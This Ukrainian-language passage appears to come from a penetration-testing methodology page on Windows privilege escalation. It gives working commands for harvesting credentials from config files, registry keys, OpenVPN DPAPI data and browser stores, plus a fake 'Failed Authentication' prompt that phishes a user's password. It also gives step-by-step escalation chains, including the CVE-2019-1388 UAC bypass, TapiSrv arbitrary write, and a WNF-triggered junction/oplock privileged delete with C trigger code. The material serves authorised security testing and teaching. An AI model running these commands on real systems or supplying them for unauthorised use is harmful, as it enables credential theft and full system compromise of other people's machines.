C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Приклад web.config з обліковими даними:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Резервні архіви в кореневому каталозі вебсайту IIS

Старий ZIP-архів резервної копії, розміщений безпосередньо в кореневому каталозі вебсайту, може містити попередні файли конфігурації та облікові дані, які можна повторно використати. Перш ніж вважати це витоком даних, перевірте налаштований фізичний шлях сайту та чи справді архів доступний через HTTP. Шлях за замовчуванням `C:\inetpub\wwwroot` — лише можливий варіант. Швидка локальна інвентаризація дасть змогу переглянути назви й розміри файлів, не відкриваючи архіви:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Назва архіву не підтверджує, що він містить секретні дані або що відновлені облікові дані надають вищі привілеї.

### Облікові дані OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Журнали

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Запит облікових даних

Ви завжди можете **попросити користувача ввести свої облікові дані або навіть облікові дані іншого користувача**, якщо вважаєте, що він може їх знати (зауважте, що **прямо просити** клієнта надати **облікові дані** справді **ризиковано**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Можливі назви файлів, що містять облікові дані**

Відомі файли, які колись містили **паролі** у **відкритому тексті** або Base64

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Варіант зі списком імен файлів без розширення Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Бази даних Password Safe v3 зазвичай мають розширення `.psafe3`. Вважайте файл із таким розширенням потенційним зашифрованим сховищем; його наявність не означає, що ви можете прочитати його, розблокувати або використати збережені облікові дані. Під час перевірки місць зберігання таких файлів перевірте доступні профілі користувачів і налаштовані кореневі каталоги спільного доступу до файлів.

Файл KeePass `.kdbx`, який можна прочитати, також є лише підказкою про наявність зашифрованого сховища. Для його розблокування потрібні фактичний майстер-пароль і будь-які налаштовані фактори на кшталт файлу ключа чи облікового запису. Якщо під час авторизованої перевірки в записі знайдено пару хешів LM:NT, перевірте вказаний обліковий запис і чи є хеш NT актуальним та чи приймає його служба NTLM цільової системи, перш ніж розглядати [pass-the-hash](../ntlm/README.md#pass-the-hash). Запис у сховищі сам по собі не надає прав Administrator або SYSTEM; також мають бути доступні віддалений доступ до служби, права облікового запису й окремий крок виконання через службу. В інвентаризаційному звіті зазначайте шлях до сховища та можливість його прочитати, але не виводьте базу даних або збережені облікові дані.

Знайдіть усі запропоновані файли:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Варіант із командою пошуку без розширення Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Облікові дані в кошику

Також перевірте кошик на наявність облікових даних

Перевірте доступні записи кошика на наявність видалених резервних копій і архівів конфігурацій, а також файлів, у назвах яких прямо згадуються облікові дані. Корисна резервна копія `.7z`, `.zip` або `.rar` може бути кількамісячної давності й мати звичайну назву. Windows зберігає початковий шлях і час видалення в записі `$I`, а видалений файл — у пов’язаному записі `$R`; перш ніж відкривати архів, перегляньте метадані та переконайтеся, що поточна ідентичність має право читання. Видимість залежить від тому, SID користувача та дозволів на файли, тому порожній список не доводить, що відновлюваних резервних копій немає. Вважайте назву архіву приводом для перевірки, а не доказом наявності в ньому справжнього секрету.

Доступний видалений файл `.pfx` також може бути зачіпкою для **code-signing**. Якщо він містить доступний приватний ключ, цим ключем можна підписати змінений сценарій PowerShell; [PowerShell requires a code-signing certificate with a private key](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), а [AppLocker publisher rules evaluate the signer's identity and rule scope](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Для виконання від імені іншого облікового запису поточна ідентичність має мати змогу змінити саме цей сценарій, чинне правило має приймати отриманий підпис для сценарію й цільового облікового запису, а заплановане завдання або інший процес із вищими привілеями має фактично його запускати. Сама назва файлу `.pfx`, тема сертифіката чи можливість запису сценарію не підтверджують, що весь цей ланцюжок працює. Перш ніж відкривати матеріали приватного ключа або запускати завдання, перевірте метадані, ACL, політику та команду запуску.

Також перевірте доступні бази даних профілів клієнтів обміну повідомленнями, нотатки й отримані файли на наявність зачіпок щодо облікових даних. Експорт ключа відновлення BitLocker може зберігатися у форматі HTML або TXT, іноді всередині архіву з відповідною назвою. Такі дані можуть надати доступ до окремого зашифрованого тому з давнішими резервними копіями; перевіряйте том і архів лише за наявності дозволу. Якщо резервна копія містить `NTDS.dit`, для відновлення облікових даних домену в автономному режимі також потрібен відповідний вулик `SYSTEM`, як описано в [backup and privileged-groups workflow](../active-directory-methodology/privileged-groups-and-token-privileges.md). Назви файлів і сам факт блокування тому не доводять, що існує придатний ключ відновлення чи резервна копія домену.

Щоб **відновити паролі**, збережені кількома програмами, можна скористатися: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### У реєстрі

**Інші можливі розділи реєстру з обліковими даними**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Історія браузера

Перевірте наявність баз даних, у яких зберігаються паролі з **Chrome або Firefox**.\
Перевірте наявність баз даних, у яких зберігаються паролі з **Chrome, Edge або Firefox**.\
Також перевірте історію, закладки та вибране у браузерах — можливо, там зберігаються **паролі**.

Для стандартного профілю Edge **Default** поточного користувача файл `Login Data` розташований у `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, а `Local State` — у батьківському каталозі `User Data`. [Microsoft документує розташування профілю за замовчуванням](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); інший профіль або політика `UserDataDir` можуть змінити його. Наявність файлів — лише привід перевірити сховище облікових даних: переконайтеся, що файли доступні для читання, що є контекст DPAPI відповідного користувача або інший дозволений матеріал ключа, і що збережений логін належить обліковому запису з вищими привілеями. Перерахування лише шляхів не вимагає відкривати базу даних або виводити розшифровані паролі.

Для Firefox [Mozilla документує](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), що `key4.db` і `logins.json` профілю — це парні файли ключа та зашифрованих логінів. Їхня наявність — лише привід для перевірки: з’ясуйте, чи доступні для читання обидва файли, чи є збережені записи та чи захищений ключ Primary Password, перш ніж робити висновок, що облікові дані можна використати. Якщо відновлені облікові дані належать доменному обліковому запису, окремо перевірте ефективні права цього облікового запису на керування групами та [права групи на читання або розшифрування пароля LAPS](../active-directory-methodology/laps.md); самі артефакти браузера не підтверджують наявність шляху до прав адміністратора.

Інструменти для вилучення паролів із браузерів:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** — це технологія, вбудована в операційну систему Windows, яка забезпечує **взаємодію** між програмними компонентами, написаними різними мовами. Кожен компонент COM **ідентифікується за допомогою ідентифікатора класу (CLSID)**, а функціональність кожного компонента доступна через один або кілька інтерфейсів, ідентифікованих за допомогою ідентифікаторів інтерфейсів (IID).

Класи та інтерфейси COM визначені в реєстрі відповідно в розділах **HKEY\CLASSES\ROOT\CLSID** і **HKEY\CLASSES\ROOT\Interface**. Цей реєстр створюється шляхом об’єднання **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

У розділах CLSID цього реєстру можна знайти дочірній розділ реєстру **InProcServer32**, який містить **значення за замовчуванням**, що вказує на **DLL**, і значення з назвою **ThreadingModel**, яке може мати значення **Apartment** (однопотокова модель), **Free** (багатопотокова модель), **Both** (однопотокова або багатопотокова модель) або **Neutral** (потоково-нейтральна модель).

![Історія браузера — COM DLL Overwriting: у розділах CLSID цього реєстру можна знайти дочірній розділ реєстру InProcServer32, який містить значення за замовчуванням, що вказує на DLL, і значення...](<../../images/image (729).png>)

Загалом, якщо ви можете **перезаписати будь-які DLL**, які виконуватимуться, то зможете **підвищити привілеї**, якщо цю DLL виконуватиме інший користувач.

Щоб дізнатися, як зловмисники використовують COM Hijacking як механізм закріплення, перегляньте:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Пошук паролів у файлах і реєстрі**

**Пошук вмісту файлів**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Пошук файлу з певним ім’ям**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Шукайте в реєстрі назви ключів і паролі**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Інструменти для пошуку паролів

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) — це плагін msf, який я створив для **автоматичного запуску кожного POST-модуля metasploit, що шукає облікові дані** на комп’ютері жертви.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) автоматично шукає всі файли з паролями, згаданими на цій сторінці.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) — ще один чудовий інструмент для отримання паролів із системи.

Інструмент [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) шукає **сесії**, **імена користувачів** і **паролі** в кількох інструментах, які зберігають ці дані у відкритому тексті (PuTTY, WinSCP, FileZilla, SuperPuTTY і RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Витік дескрипторів

Уявіть, що **процес, запущений від імені SYSTEM, відкриває новий процес** (`OpenProcess()`) **із повним доступом**. Той самий процес **також створює новий процес** (`CreateProcess()`) **із низькими привілеями, але той успадковує всі відкриті дескриптори головного процесу**.\
Тоді, якщо ви маєте **повний доступ до процесу з низькими привілеями**, ви можете отримати **відкритий дескриптор створеного привілейованого процесу**, створений за допомогою `OpenProcess()`, і **впровадити shellcode**.\
[Прочитайте цей приклад, щоб дізнатися більше про **виявлення та експлуатацію цієї вразливості**.](leaked-handle-exploitation.md)\
[Прочитайте [**цю іншу статтю**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/) з докладнішим поясненням того, як перевіряти та зловживати іншими відкритими дескрипторами процесів і потоків, успадкованими з різними рівнями дозволів (не лише з повним доступом).](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Імперсонація клієнта Named Pipe

Сегменти спільної пам’яті, які називають **pipes**, забезпечують взаємодію між процесами та передавання даних.

Windows має функцію **Named Pipes**, яка дає змогу не пов’язаним між собою процесам обмінюватися даними, зокрема через різні мережі. Це схоже на архітектуру клієнт/сервер із ролями **сервера named pipe** та **клієнта named pipe**.

Коли **клієнт** надсилає дані через pipe, **сервер**, який створив pipe, може **прийняти особу** **клієнта**, якщо має необхідні права **SeImpersonate**. Якщо виявити **привілейований процес**, який взаємодіє через pipe, що ви можете імітувати, з’являється можливість **отримати вищі привілеї**, прийнявши особу цього процесу після його взаємодії зі створеним вами pipe. Інструкції з виконання такої атаки можна знайти [**тут**](named-pipe-client-impersonation.md) і [**тут**](#from-high-integrity-to-system).

Також наведений нижче інструмент дає змогу **перехоплювати обмін даними через named pipe за допомогою інструмента на зразок burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **а цей інструмент дає змогу переглядати всі pipes, щоб знаходити privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Віддалений запис DWORD через Telephony tapsrv до RCE

Служба Telephony (TapiSrv) у режимі сервера відкриває `\\pipe\\tapsrv` (MS-TRP). Віддалений автентифікований клієнт може зловживати асинхронним шляхом подій на основі mailslot, перетворивши `ClientAttach` на довільний **4-байтовий запис** у будь-який наявний файл, доступний для запису користувачу `NETWORK SERVICE`, а потім отримати права адміністратора Telephony і завантажити довільну DLL як служба. Повний ланцюжок:

- Викликати `ClientAttach`, задавши для `pszDomainUser` шлях до наявного файла, доступного для запису → служба відкриє його через `CreateFileW(..., OPEN_EXISTING)` і використовуватиме для запису асинхронних подій.
- Кожна подія записує контрольований зловмисником `InitContext` із `Initialize` у цей дескриптор. Зареєструвати line app за допомогою `LRegisterRequestRecipient` (`Req_Func 61`), запустити `TRequestMakeCall` (`Req_Func 121`), отримати дані через `GetAsyncEvents` (`Req_Func 0`), а потім скасувати реєстрацію та завершити роботу, щоб повторювати детерміновані записи.
- Додати себе до `[TapiAdministrators]` у `C:\Windows\TAPI\tsec.ini`, підключитися знову, а потім викликати `GetUIDllName` із довільним шляхом до DLL, щоб виконати `TSPI_providerUIIdentify` від імені `NETWORK SERVICE`.

Докладніше:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Різне

### Розширення файлів, які можуть запускати код у Windows

Перегляньте сторінку **[https://filesec.io/](https://filesec.io/)**

### Зловживання обробниками протоколів / ShellExecute через засоби відображення Markdown

Клікабельні посилання Markdown, передані до `ShellExecuteExW`, можуть запускати небезпечні URI-обробники (`file:`, `ms-appinstaller:` або будь-яку зареєстровану схему) та виконувати контрольовані зловмисником файли від імені поточного користувача. Дивіться:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Моніторинг командних рядків на наявність паролів**

Коли ви отримуєте shell від імені користувача, можуть виконуватися заплановані завдання чи інші процеси, які **передають облікові дані в командному рядку**. Наведений нижче скрипт кожні дві секунди записує командні рядки процесів, порівнює поточний стан із попереднім і виводить усі відмінності.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Викрадення паролів із процесів

## Від користувача з низькими привілеями до NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Якщо у вас є доступ до графічного інтерфейсу (через консоль або RDP) і UAC увімкнено, у деяких версіях Microsoft Windows можна запустити термінал або будь-який інший процес, наприклад від імені «NT\AUTHORITY SYSTEM», з непривілейованого облікового запису.

Це дає змогу одночасно підвищити привілеї та обійти UAC, використовуючи одну й ту саму вразливість. Крім того, нічого не потрібно встановлювати, а бінарний файл, який використовується під час процесу, підписаний і виданий Microsoft.

Деякі з уразливих систем:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Щоб експлуатувати цю вразливість, необхідно виконати такі кроки:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Вам доступні всі необхідні файли та відомості в цьому репозиторії GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Від середнього до високого рівня цілісності адміністратора / обхід UAC

Прочитайте це, щоб **дізнатися про рівні цілісності**:


{{#ref}}
integrity-levels.md
{{#endref}}

Потім **прочитайте це, щоб дізнатися про UAC та його обхід:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junctions у каталозі завантажень, що ведуть до кореневого каталогу вебсервера

Застосунок може створювати передбачуваний підкаталог для завантажень, записувати в нього файл із заданим користувачем ім’ям, а потім обробляти цей файл. Якщо користувач із низькими привілеями може видалити цей підкаталог і замінити його NTFS junction до запису з боку сервера, запис може перейти через junction до каталогу, доступного через вебсервер. Розміщений там скрипт може виконуватися від імені облікового запису вебслужби, якщо сервер виконує файли такого типу. Це специфічна для застосунку межа довільного запису; сам факт, що каталог завантажень доступний для запису або що там уже є junction, цього не доводить.

Перевірте точне формування шляху та час виконання в обробнику завантажень, ефективні права користувача на видалення та створення підкаталогу, ефективні ACL цільового каталогу, чи переходить записувач за точками повторної обробки, а також чи виконує вебсервер файли в цільовому каталозі. Окремо підтвердьте ідентичності процесів записувача та вебсервера. Пасивна інвентаризація може показати ACL каталогів і метадані reparse point, але не може встановити поведінку обробника або факт майбутньої підміни junction. Якщо виконання відбувається від імені облікового запису служби, перед розглядом окремого шляху через привілеї токена перевірте **фактичний токен процесу**.

## Очищення привілейованого запланованого завдання, ініційоване WNF

Заплановане завдання, яке забороняє ручний запуск, усе одно може мати тригер, доступний непривілейованому користувачеві. Під час аудиту привілейованого завдання експортуйте його XML і перевірте **всі** тригери, а також DACL завдання, principal і дію. Зокрема, `WnfStateChangeTrigger` вказує на стан Windows Notification Facility (WNF); якщо поточний користувач має право публікувати оновлення цього захищеного стану, він може опосередковано запустити завдання від імені налаштованої ідентичності, навіть якщо задано `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Наприклад, завдання Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` виконувалося від імені SYSTEM, приймало від стандартного користувача оновлення стану WNF `7508BCA32C079E41`, а потім перевіряло `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}`, навіть коли Recall було вимкнено.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Щоб перевірити досяжність, знайдіть `ZwUpdateWnfStateData` у `ntdll.dll`, надішліть порожнє оновлення для восьмибайтової назви стану й зіставте код повернення з даними про останній запуск завдання або активністю Procmon. У наведеному нижче скороченому тестовому коді використовується послідовність байтів із прикладу завдання Recall; підставте байти, експортовані для завдання, яке перевіряєте.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Перетворення рекурсивного очищення на привілейоване видалення

Корисний примітив — це не сам тригер, а привілейована процедура очищення, яка приймає контрольований зловмисником каталог. Простежте операцію від переліку до кінцевої зміни: пошук профілів/сеансів, вибір дочірніх елементів за шаблоном, `SHCreateItemFromParsingName` і `IFileOperation::DeleteItem` — вагомі ознаки того, що раніше перевірений шлях згодом буде рекурсивно оброблено. Якщо дочірні елементи не відкриваються відносно довірених дескрипторів каталогів і не перевіряються перед видаленням, зловмисник може змінити спосіб розв’язання шляху між переліком і використанням.<sup>[[43]](#references)</sup>

Поєднайте тригер WNF із [підміною через oplock, junction і символічне посилання Object Manager](#from-folder-contents-delete-to-system-eop), описаною нижче: oplock призупиняє процес очищення після вибору легітимного дочірнього елемента, а потім замінюється доступний для запису батьківський каталог, тож після відновлення привілейоване видалення веде через `\RPC Control` до захищеної цілі. У ланцюжку Recall це призвело до видалення `C:\Config.Msi` від імені SYSTEM, необхідного для задокументованої техніки відкату MSI.<sup>[[31]](#references)[[43]](#references)</sup>

### Вкладені дочірні елементи обходять поверхневі виправлення для точок повторної обробки

Перевірка лише контрольованого зловмисником кореневого каталогу та його безпосереднього дочірнього елемента не захищає від рекурсивного видалення за шляхом. Залиште перевірені об’єкти легітимними, а підміну junction/oplock перемістіть у додатковий дочірній елемент нижче за ієрархією; зрештою `IFileOperation::DeleteItem` дійде до неперевіреного дочірнього елемента та перейде за його новою ціллю. CVE-2026-20941 виникла саме через таке неповне виправлення: після першого патча Recall перевіряли `UKP` і каталог із GUID-подібною назвою, але стару операцію рекурсивного видалення залишили без змін.<sup>[[43]](#references)</sup>

Безпечний підхід — відкрити **кожен дочірній елемент** відносно вже довіреного дескриптора каталогу, отримати й перевірити кінцевий розв’язаний шлях/об’єкт і застосувати позначку видалення до перевіреного дескриптора. Не перевіряйте префікс, а потім не повертайтеся до рекурсивного видалення за шляхом. Під час перевірки патча також досліджуйте структури в місці фактичного виклику: у цьому випадку під час виконання `OBJECT_ATTRIBUTES` у `NtCreateFile` показав ненульовий `RootDirectory` і відносне ім’я `{GUID}\\secure_file.lock`, що спростувало оманливий вивід декомпілятора, який припускав наявність другого примітива `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Від довільного видалення/переміщення/перейменування папки до SYSTEM EoP

Техніка описана [**у цій публікації блогу**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), а exploit code [**доступний тут**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Суть атаки — зловживання функцією відкату Windows Installer, щоб під час видалення замінити легітимні файли шкідливими. Для цього зловмиснику потрібно створити **шкідливий інсталятор MSI**, який буде використано для перехоплення каталогу `C:\Config.Msi`. Пізніше Windows Installer використовуватиме його для зберігання файлів відкату під час видалення інших пакетів MSI, причому файли відкату буде змінено так, щоб вони містили шкідливе корисне навантаження.

### Ін’єкція шляху очищення Windows Installer COM (CVE-2025-27727)

Клієнт із низькими привілеями може звернутися до служби `msiexec.exe` із привілеями SYSTEM через COM-об’єкт `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Зворотний аналіз визначив відповідні виклики `IMsiServer`: `MsiBeginTransactionW` зі зміщенням `0xA0` у vtable, `SetEEUIDirectoryAndFilter` зі зміщенням `0xC8` і `CleanupTempPackages` зі зміщенням `0x50`. Ці назви та зміщення встановлено зворотним аналізом, і вони можуть відрізнятися в різних збірках.<sup>[[41]](#references)</sup>

